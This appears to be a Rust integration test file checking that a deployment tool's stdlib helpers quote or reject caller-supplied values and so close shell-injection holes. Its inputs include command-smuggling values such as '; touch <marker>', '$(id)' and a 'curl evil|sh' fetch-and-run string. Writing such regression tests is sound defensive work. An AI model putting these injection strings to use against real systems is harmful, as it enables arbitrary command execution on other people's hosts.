//! Integration: two stdlib helpers that spliced a
//! caller-controlled value into a remote/local shell command WITHOUT `sh_quote()`, so a
//! value containing shell metacharacters (`;`, `"`, `$(...)`) could run arbitrary extra
//! commands (issue #10's quoting contract).
//!
//! Both tests prove the fix the same way: build the exact command the library would run,
//! feed it through a REAL `sh -c` (via `local_exec`, unstubbed under a live — non-dry-run —
//! `nrg exec`), and assert an injected `touch <marker>` never created the marker file. This
//! is a real repro, not a string-shape assertion — it fails the same way a live exploit
//! would have succeeded before the fix, and doesn't need `aws`/`docker` installed: the
//! injected statement is a top-level shell command that runs regardless of whether the
//! surrounding `aws`/`docker` invocation itself succeeds or fails (command-not-found).

use assert_cmd::Command;
use std::fs;
use std::path::Path;

/// Escape `s` so it can be embedded as the content of a Rhai double-quoted string literal.
fn rhai_string_literal(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

fn run_live(dir: &Path, script: &str) {
    fs::create_dir_all(dir.join(".energize")).unwrap();
    fs::write(dir.join("Energize.rhai"), script).unwrap();
    // Exit code is irrelevant here (aws/docker are almost certainly not installed in the test
    // environment, so the real login/exec calls fail with "command not found" — that's fine,
    // and expected); only whether the injected statement ran is under test.
    let _ = Command::cargo_bin("nrg")
        .unwrap()
        .current_dir(dir)
        .arg("exec")
        .output();
}

/// `ecr_login`'s account-auto-detect branch used to splice `cfg.region` RAW inside an
/// already-double-quoted subshell string, where `;`, `"`, and `$(...)` all stayed live.
#[test]
fn ecr_login_region_cannot_inject_shell_commands() {
    let dir = tempfile::tempdir().unwrap();
    let marker = dir.path().join("injected.marker");
    // Old (vulnerable) substitution site: `"..." + region + "..."` inside a double-quoted
    // shell string. A region ending the double quote, adding a `;`-separated command, and
    // reopening a matching double quote breaks out and runs `touch <marker>` as its own
    // top-level statement.
    let region = format!("x\"; touch {}; echo \"", marker.display());
    let script = format!(
        r#"
        import "std/registry" as registry;
        registry::ecr_login("local", #{{ region: "{region}" }});
        "#,
        region = rhai_string_literal(&region),
    );
    run_live(dir.path(), &script);
    assert!(
        !marker.exists(),
        "cfg.region injected a shell command via ecr_login's account-auto-detect branch"
    );
}

/// `runtime_exec_cmd(container_name, command)` spliced `container_name` RAW into the
/// command line, unlike its `docker_exec` twin (which quotes the name).
#[test]
fn runtime_exec_cmd_container_name_cannot_inject_shell_commands() {
    let dir = tempfile::tempdir().unwrap();
    let marker = dir.path().join("injected.marker");
    let name = format!("x; touch {}; echo y", marker.display());
    let script = format!(
        r#"
        import "std/runtime" as rt;
        let cmd = rt::runtime_exec_cmd("{name}", "echo hi");
        local_exec(cmd);
        "#,
        name = rhai_string_literal(&name),
    );
    run_live(dir.path(), &script);
    assert!(
        !marker.exists(),
        "container_name injected a shell command via runtime_exec_cmd"
    );
}

/// Run `script` under `nrg exec --dry-run` in a fresh dir; returns (success, stdout, stderr).
fn run_dry(script: &str) -> (bool, String, String) {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join(".energize")).unwrap();
    fs::write(dir.path().join("Energize.rhai"), script).unwrap();
    let out = Command::cargo_bin("nrg")
        .unwrap()
        .current_dir(dir.path())
        .args(["exec", "--dry-run", "Energize.rhai"])
        .output()
        .unwrap();
    (
        out.status.success(),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

/// Issue #10 — a non-integer health-check timeout used to pass the `timeout < 1` guard (Rhai
/// evaluates `"5; x" < 1` as false) and was spliced raw into the remote curl command.
#[test]
fn health_timeout_must_be_an_integer() {
    for (func, call) in [
        (
            "wait_healthy_on_host",
            r#"hc::wait_healthy_on_host("web1", 8080, #{ timeout: "5; touch /tmp/x" });"#,
        ),
        (
            "wait_healthy",
            r#"hc::wait_healthy("http://localhost:1/up", #{ timeout: "5; touch /tmp/x" });"#,
        ),
    ] {
        let (ok, out, err) = run_dry(&format!("import \"std/healthcheck\" as hc;\n{call}"));
        assert!(!ok, "{func} accepted a string timeout");
        assert!(
            err.contains("cfg.timeout must be a positive number"),
            "{func}: wrong failure: {err}"
        );
        assert!(
            !out.contains("touch /tmp/x"),
            "{func} planned the payload: {out}"
        );
    }
}

/// Issue #10 — a fractional timeout is valid (`curl --max-time` accepts it) and reaches the
/// plan (its quoting at the curl splice is pinned by the live FakeRunner test
/// `wait_healthy_on_host_float_timeout_reaches_curl_shell_quoted`); non-finite or non-positive
/// floats are rejected before any command is built.
#[test]
fn health_timeout_float_is_accepted_when_positive_and_finite() {
    for call in [
        r#"hc::wait_healthy_on_host("web1", 8080, #{ timeout: 2.5 });"#,
        r#"hc::wait_healthy("http://localhost:1/up", #{ timeout: 2.5 });"#,
    ] {
        let (ok, _, err) = run_dry(&format!("import \"std/healthcheck\" as hc;\n{call}"));
        assert!(ok, "float timeout rejected: {err}");
    }
    for bad in ["0.0", "-1.5", "0.0 / 0.0", "1.0 / 0.0"] {
        let (ok, out, err) = run_dry(&format!(
            "import \"std/healthcheck\" as hc;\nhc::wait_healthy_on_host(\"web1\", 8080, #{{ timeout: {bad} }});"
        ));
        assert!(!ok, "timeout {bad} accepted: {out}");
        assert!(err.contains("cfg.timeout must be"), "{bad}: {err}");
    }
}

/// Issue #10 — a valid integer timeout still reaches the plan.
#[test]
fn health_timeout_integer_is_still_accepted() {
    let (ok, _, err) = run_dry(
        r#"import "std/healthcheck" as hc;
        hc::wait_healthy_on_host("web1", 8080, #{ timeout: 5 });"#,
    );
    assert!(ok, "integer timeout rejected: {err}");
}

/// Issue #10 — the caddy maintenance status code is concatenated into JSON; it must be an
/// integer 100-599.
#[test]
fn caddy_maintenance_status_code_is_validated() {
    for bad in [r#""503,\"evil\":1""#, "99", "600", "5.5"] {
        let (ok, _, err) = run_dry(&format!(
            "import \"std/caddy\" as caddy;\ncaddy::proxy_maintenance(\"web1\", \"app\", true, #{{ status_code: {bad} }});"
        ));
        assert!(!ok, "status_code {bad} accepted");
        assert!(
            err.contains("status_code must be an integer 100-599"),
            "{bad}: {err}"
        );
    }
    let (ok, _, err) = run_dry(
        r#"import "std/caddy" as caddy;
        caddy::proxy_maintenance("web1", "app", true, #{ status_code: 502 });"#,
    );
    assert!(ok, "valid status_code rejected: {err}");
}

/// Issue #10 item 4 — metacharacters in docker_run / caddy inputs reach the plan
/// only as single-quoted words.
#[test]
fn docker_run_and_proxy_deploy_quote_metacharacters_in_the_plan() {
    let (ok, out, err) = run_dry(
        r#"import "std/docker" as docker;
        import "std/caddy" as caddy;
        docker::docker_run("web1", "app:v1;curl evil|sh", "n$(id)", #{});
        caddy::proxy_deploy("web1", "svc'x;id", "10.0.0.1:3000", #{ domain: "a.example.com" });"#,
    );
    assert!(ok, "dry-run failed: {err}");
    assert!(
        out.contains("'app:v1;curl evil|sh'"),
        "image not quoted: {out}"
    );
    assert!(out.contains("'n$(id)'"), "name not quoted: {out}");
    assert!(
        out.contains(r#"svc'\''x;id"#),
        "caddy service not quoted: {out}"
    );
}
